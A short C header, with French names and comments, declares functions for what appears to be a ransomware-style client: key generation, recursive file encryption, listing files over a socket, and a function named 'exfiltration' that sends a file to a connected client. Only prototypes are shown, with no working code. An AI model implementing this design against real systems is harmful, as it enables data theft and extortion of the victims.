#ifndef FONCTION_H
#define FONCTION_H

#include "common.h"

void generer_client_id(char *id, size_t length);
void listFiles(my_socket_t clientSocket);
void generateEncryptionKey(char *keyBuffer, size_t length);
void encryptFile(const char *filename, const char *key);
void encryptFiles(const char *directory, const char *encryptionKey);
int exfiltration(my_socket_t clientSocket, const char *fichier); // Changement de 'dossier' à 'fichier'
void custom_fork();
int isRegularFile(const char *path);
void logError(const char *message);

#endif // FONCTION_H
